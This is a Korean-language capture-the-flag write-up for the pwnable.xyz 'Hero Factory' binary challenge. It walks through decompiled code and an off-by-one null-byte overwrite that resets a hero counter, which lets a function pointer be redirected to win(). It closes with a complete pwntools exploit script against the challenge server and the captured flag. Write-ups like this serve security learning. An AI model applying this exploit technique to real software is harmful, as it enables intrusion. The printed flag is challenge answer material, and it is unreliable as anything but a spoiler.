# [pwnable.xyz] Hero Factory

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Everybody got a gimmick now
>
> Release: [Hero Factory.zip](https://github.com/h0meb0dy/pwnable.xyz/files/9042770/Hero.Factory.zip)

## Mitigation

![image-20220705111339430](C:\Users\h0meb0dy\AppData\Roaming\Typora\typora-user-images\image-20220705111339430.png)

## Analysis

### `win()`

```c
int win()
{
  return system("cat flag");
}
```

`win()`이 실행되도록 하면 플래그를 획득할 수 있다.

### `main()`

#### 1. create a superhero

```c
      if ( OP != 1 )
        goto LABEL_13;
      createHero(*(_QWORD *)&argc);
```

#### `createHero()`

```c
  if ( heroCount )
  {
    puts("Br0, you already have a hero...");
    return __readfsqword(0x28u) ^ v6;
  }
  ++heroCount;
```

전역 변수 `heroCount`의 값이 `0`이 아니면 이미 히어로가 존재하므로 함수를 종료한다. 그렇지 않으면 `heroCount`를 1 증가시킨다.

```c
  puts("How long do you want your superhero's name to be? ");
  len = getInt();
  if ( (unsigned int)len >= 101 )
  {
    puts("Bad size!");
    return __readfsqword(0x28u) ^ v6;
  }
```

이름의 길이를 입력받는다. `101` 이상을 입력하면 함수를 종료한다.

```c
  printf("Great! Please enter your hero's name: ");
  read(0, heroName, len);
  end = strchr(name, 0);
  strncat(end, heroName, 100uLL);
```

`heroName`에 `len`만큼 이름을 입력받고, 전역 변수 `name`의 끝을 찾아서 그 위치에 `heroName`을 이어붙인다.

```c
  printSuperPowers();
  superPower = getInt();
  if ( superPower == 2 )
  {
    power = (__int64 (*)(void))crossfit;
    strcpy((char *)&myHero, "crossfit");
    goto LABEL_18;
  }
  if ( superPower <= 2 )
  {
    if ( superPower != 1 )
      goto LABEL_16;
    power = hadouken;
    strcpy((char *)&myHero, "hadouken");
LABEL_18:
    puts("Superhero successfully created!");
    return __readfsqword(0x28u) ^ v6;
  }
  if ( superPower == 3 )
  {
    power = (__int64 (*)(void))wrestle;
    strcpy((char *)&myHero, "wrestling");
    goto LABEL_18;
  }
  if ( superPower == 4 )
  {
    power = (__int64 (*)(void))floss;
    strcpy((char *)&myHero, "flossing");
    goto LABEL_18;
  }
LABEL_16:
  puts("not a valid power!");
  if ( heroCount )
    zeroHero();
```

히어로의 슈퍼파워를 선택한다. `crossfit`, `hadouken`, `wrestling`, `flossing` 4가지의 슈퍼파워가 있다.

전역 변수 `power`에는 슈퍼파워에 해당하는 함수의 포인터를 넣는다. `hadouken()`을 제외한 나머지 함수들은 `exit()`을 호출하여 프로그램을 종료한다.

전역 변수 `myHero`에는 슈파파워에 해당하는 문자열을 복사해서 넣는다.

#### 2. use a superpower

```c
      if ( op != 2 )
        break;
      usePower();
```

#### `usePower()`

```c
int usePower()
{
  if ( !heroCount )
    return puts("You don't even have a hero right now....");
  puts("Your hero uses his ability...");
  return power();
}
```

`heroCount`가 `0`이 아니면 `power`에 저장된 함수를 호출한다.

#### 3. destroy a superhero

```c
      if ( op == 3 )
      {
        deleteHero();
      }
```

#### `deleteHero()`

```c
int deleteHero()
{
  char destroy; // [rsp+Fh] [rbp-1h]

  if ( !heroCount )
    return puts("Stop wasting my time.");
  printHero();
  printf("\nAre you sure you want to destroy your hero? (y/n) ");
  destroy = getchar();
  if ( destroy != 'y' && destroy != 'Y' )
    return puts("Stop wasting my time.");
  zeroHero();
  return puts("Hero successfully destroyed!");
}
```

## Exploit

히어로를 생성할 때 이름에 `100`바이트를 가득 채워서 입력하면 `strncat()`으로 복사될 때 마지막에 `'\x00'`이 붙어서 바로 뒤에 있는 `heroCount`를 `0`으로 덮어쓰게 된다.

![image](https://user-images.githubusercontent.com/104156058/178637197-784f689a-c5da-4b7a-bc6c-1dac918a9078.png)

이 상태에서 히어로를 한 번 더 생성하면 `heroCount`가 1이 되고,

![image](https://user-images.githubusercontent.com/104156058/178637162-06fee762-0b74-4060-98d0-ff1c1202a8b5.png)

입력한 이름은 `0x602279`부터 채워진다.

![image](https://user-images.githubusercontent.com/104156058/178637149-6eddb1e0-30a1-4b7b-849e-3e0e31b05c91.png)

슈퍼파워를 선택할 때 `1`~`4`가 아닌 다른 값을 입력하면 `zeroHero()`가 호출되지만 `power`에는 아무 변화가 없다. 따라서 `power`에 `win()`의 주소를 넣고 `usePower()`를 호출하면 플래그를 획득할 수 있다.

### Full exploit

```python
from pwn import *

LOCAL = False

if LOCAL:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30032)

sla = r.sendlineafter
sa = r.sendafter

def create(len, name, superpower):
    sla('> ', '1')
    sla('How long do you want your superhero\'s name to be? \n', str(len))
    sa('Great! Please enter your hero\'s name: ', name)
    sla('> ', str(superpower))

def use():
    sla('> ', '2')

win = 0x400a33

create(100, 'A' * 100, 1)
create(100, b'B' * 7 + p64(win), 0)
use()

r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30032: Done
[*] Switching to interactive mode
Your hero uses his ability...
FLAG{charge_ur_pwn_superpower}
```